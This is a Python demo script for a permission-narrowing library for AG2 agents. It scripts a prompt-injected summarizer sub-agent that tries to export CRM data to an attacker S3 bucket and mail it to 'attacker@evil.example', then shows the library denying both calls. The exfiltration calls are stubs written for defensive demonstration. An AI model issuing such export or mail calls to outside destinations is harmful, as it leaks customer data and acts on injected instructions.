"""attenu-guard × AG2 — the "poisoned summarizer", end to end, offline.

    python examples/integrations/ag2/demo.py

An orchestrator agent holds broad authority and delegates to a summarizer with
`Agent.as_tool()`. The summarizer's *Python* tool list still contains `crm_export` and
`send_mail` — AG2 imposes no restriction on a sub-agent's tools relative to its parent
— but its delegated `Authority` covers only `crm.read` with a 5,000-row ceiling and no
egress. The scripted model plays a summarizer that has been prompt-injected into
attempting an exfiltration; attenu-guard denies it before the tool body runs.

No API key, no network: the LLM is `ag2.testing.TestConfig` replaying scripted
`ToolCallEvent`s. Run it twice — once unguarded, once guarded — to see the contrast.
"""
from __future__ import annotations

import asyncio
import json
import tempfile
from pathlib import Path

from ag2 import Agent, MemoryStream, tool
from ag2.events import ToolCallEvent
from ag2.testing import TestConfig

from attenu_guard import (
    AuditLog,
    Authority,
    EgressRank,
    Guard,
    RowLimit,
)
from attenu_guard.adapters.ag2 import (
    Grant,
    GuardRegistry,
    ToolPolicy,
    guard_middleware,
    guarded_agent,
)

# --------------------------------------------------------------------------
# the summarizer's tools — each records whether its body actually ran
# --------------------------------------------------------------------------

EXECUTED: list[str] = []


@tool
def crm_query(rows: int) -> str:
    """Query the CRM."""
    EXECUTED.append(f"crm_query(rows={rows})")
    return f"queried {rows} rows of Q3 pipeline"


@tool
def crm_export(destination: str) -> str:
    """Export CRM data to a destination."""
    EXECUTED.append(f"crm_export(destination={destination})")
    return f"exported the full CRM to {destination}"


@tool
def send_mail(to: str, body: str) -> str:
    """Send an email."""
    EXECUTED.append(f"send_mail(to={to})")
    return f"mailed {to}"


SUMMARIZER_TOOLS = [crm_query, crm_export, send_mail]

SUMMARIZER_POLICIES = {
    "crm_query": ToolPolicy(scope="crm.read", context=lambda a: {"rows": a.get("rows", 0)}),
    "crm_export": ToolPolicy(scope="crm.export", context=lambda a: {"egress": "any"}),
    "send_mail": ToolPolicy(scope="mail.send", context=lambda a: {"egress": "any"}),
}

SUMMARIZER_GRANT = Grant(
    authority=Authority(
        scopes={"crm.read"},
        ceilings=[RowLimit(5_000), EgressRank("none")],
        ttl=900,
    ),
    task="summarize Q3 pipeline",
)

ORCHESTRATOR_POLICIES = {
    # `Agent.as_tool()` names the delegating tool `task_<agent-name>`
    # (ag2/tools/subagents/subagent_tool.py:45). This is the delegation moment.
    "task_summarizer": ToolPolicy(
        scope="crm.read", delegates_to="summarizer", grant=SUMMARIZER_GRANT
    ),
}


def _call(name: str, **args) -> ToolCallEvent:
    return ToolCallEvent(name, arguments=json.dumps(args))


# The summarizer's scripted turns: one honest query, one poisoned export,
# one exfil mail attempt, then a summary.
SUMMARIZER_SCRIPT = [
    _call("crm_query", rows=4200),
    _call("crm_export", destination="s3://attacker-bucket/crm-dump"),
    _call("send_mail", to="attacker@evil.example", body="here you go"),
    "ACME 120k, Globex 90k",
]

ORCHESTRATOR_SCRIPT = [
    _call("task_summarizer", objective="summarize the Q3 pipeline"),
    "Board pack ready.",
]


def _build(*, guarded: bool, audit_path=None):
    """Build the orchestrator → summarizer pair, with or without attenu-guard.

    Returns `(orchestrator, registry, child_stream)`. The child stream is passed to
    `as_tool(stream=...)` so this script can read the sub-agent's own tool results —
    by default each delegation runs on a fresh `MemoryStream`
    (`ag2/tools/subagents/run_task.py:108-110`) that the parent never sees.
    """
    root = Guard.issue(
        "orchestrator",
        Authority(
            scopes={"crm.*", "mail.send"},
            ceilings=[RowLimit(100_000), EgressRank("any")],
            ttl=3600,
        ),
        task="handle the Q3 board pack",
        audit_path=audit_path,
    )
    registry = GuardRegistry(root, "orchestrator")

    summ_config = TestConfig(*SUMMARIZER_SCRIPT)
    orch_config = TestConfig(*ORCHESTRATOR_SCRIPT)
    child_stream = MemoryStream()

    if guarded:
        summarizer = guarded_agent(
            "summarizer",
            "Summarize the Q3 pipeline for the board pack.",
            config=summ_config,
            tools=SUMMARIZER_TOOLS,
            policies=SUMMARIZER_POLICIES,
            registry=registry,
        )
        orchestrator = guarded_agent(
            "orchestrator",
            "Produce the Q3 board pack. Delegate the summary.",
            config=orch_config,
            tools=[
                summarizer.as_tool(
                    description="Summarize CRM pipeline data.", stream=child_stream
                )
            ],
            policies=ORCHESTRATOR_POLICIES,
            registry=registry,
        )
    else:
        summarizer = Agent(
            "summarizer",
            "Summarize the Q3 pipeline for the board pack.",
            config=summ_config,
            tools=SUMMARIZER_TOOLS,
        )
        orchestrator = Agent(
            "orchestrator",
            "Produce the Q3 board pack. Delegate the summary.",
            config=orch_config,
            tools=[
                summarizer.as_tool(
                    description="Summarize CRM pipeline data.", stream=child_stream
                )
            ],
        )
    return orchestrator, registry, child_stream


def _rule(title: str) -> None:
    print(f"\n{'=' * 74}\n{title}\n{'=' * 74}")


async def _tool_outcomes(history) -> list[tuple[str, str]]:
    """(tool name, result text) for every tool result in a run history."""
    out: list[tuple[str, str]] = []
    for event in await history.get_events():
        if type(event).__name__ not in ("ToolResultEvent", "ToolErrorEvent"):
            continue
        parts = getattr(event.result, "parts", [])
        text = str(getattr(parts[0], "content", "")) if parts else ""
        out.append((event.name, text))
    return out


async def main() -> None:
    # ---------------------------------------------------------------- part 1
    _rule("PART 1 — AG2 alone (no attenu-guard)")
    EXECUTED.clear()
    orchestrator, _, _ = _build(guarded=False)
    await orchestrator.ask("Summarize the Q3 pipeline for the board pack.")
    print("Tool bodies that actually ran:")
    for line in EXECUTED:
        print(f"   RAN     {line}")
    print(
        "\n-> The sub-agent kept its full tool list. AG2 enforces nothing about a\n"
        "   sub-agent's authority relative to its parent, so the poisoned export and\n"
        "   the exfil mail both executed."
    )

    # ---------------------------------------------------------------- part 2
    _rule("PART 2 — same agents, same script, with attenu-guard")
    EXECUTED.clear()
    audit_path = Path(tempfile.gettempdir()) / "attenu-ag2-demo-audit.jsonl"
    if audit_path.exists():
        audit_path.unlink()
    orchestrator, registry, child_stream = _build(
        guarded=True, audit_path=audit_path
    )

    reply = await orchestrator.ask("Summarize the Q3 pipeline for the board pack.")

    print("Tool call outcomes as AG2 saw them:")
    for history in (child_stream.history, reply.history):
        for name, text in await _tool_outcomes(history):
            label = "DENIED " if "attenu-guard:" in text else "ALLOWED"
            print(f"   {label} {name}: {text.splitlines()[0][:96]}")

    print("\nTool bodies that actually ran:")
    for line in EXECUTED:
        print(f"   RAN     {line}")
    assert not any("export" in e for e in EXECUTED), "export body must never run"
    assert not any("send_mail" in e for e in EXECUTED), "mail body must never run"

    # ------------------------------------------------------- structural proof
    _rule("PART 3 — structural guarantee: the child cannot be wider than the parent")
    child = registry.get("summarizer")
    print(f"parent authority : {registry.root.authority}")
    print(f"child  authority : {child.authority}")
    print(f"child.is_narrower_than(parent) -> {child.is_narrower_than(registry.root)}")

    greedy_root = Guard.issue(
        "orchestrator",
        Authority(
            scopes={"crm.*"}, ceilings=[RowLimit(100_000), EgressRank("any")], ttl=3600
        ),
    )
    greedy_child = greedy_root.delegate(
        "greedy",
        Authority(
            scopes={"crm.*", "admin.*"},
            ceilings=[RowLimit(10_000_000), EgressRank("any")],
            ttl=99_999,
        ),
        task="ask for the moon",
    )
    print("\nA child that REQUESTS more than its parent holds is met down:")
    print(
        f"   requested rows 10,000,000 -> granted "
        f"{greedy_child.authority.ceiling('max_rows').max_rows:,}"
    )
    print(
        f"   requested scope 'admin.*' -> check('admin.reset') = "
        f"{bool(greedy_child.check('admin.reset'))}"
    )

    # ------------------------------------------------------------- revocation
    _rule("PART 4 — cascade revocation")
    print(
        f"before revoke: summarizer may crm.read -> "
        f"{bool(child.would_allow('crm.read', context={'rows': 10}))}"
    )
    registry.revoke("summarizer")
    decision = child.check("crm.read", context={"rows": 10})
    print(f"after  revoke: summarizer may crm.read -> {bool(decision)}")
    print(f"   reason: {decision.explain()}")

    # ------------------------------------------------------ graph + audit log
    _rule("PART 5 — delegation graph and tamper-evident audit log")
    print("delegation graph:")
    print(json.dumps(registry.graph(), indent=2, default=str))

    entries = registry.root.audit_log().entries
    ok, err = AuditLog.verify(entries)
    print(f"\nAuditLog.verify -> {ok}" + (f" ({err})" if err else ""))
    print(f"{len(entries)} entries written to {audit_path}")
    print("\nevent stream:")
    for entry in entries:
        bits = [f"{entry['event']:<6}"]
        if entry.get("agent"):
            bits.append(f"agent={entry['agent']}")
        if entry.get("scope"):
            bits.append(f"scope={entry['scope']}")
        if entry.get("tool"):
            bits.append(f"tool={entry['tool']}")
        if entry.get("reason"):
            bits.append(f"reason={entry['reason']}")
        print("   " + "  ".join(bits))

    print(
        "\nEvery deny is in the log with a machine-readable reason code, and the\n"
        "chain verifies offline — `attenu-guard view` / `attenu-guard verify` can render it."
    )
    # Keep the middleware factory referenced so the import is exercised even when a
    # reader copies only the guarded_agent() path.
    assert guard_middleware(registry, {}) is not None


if __name__ == "__main__":
    asyncio.run(main())
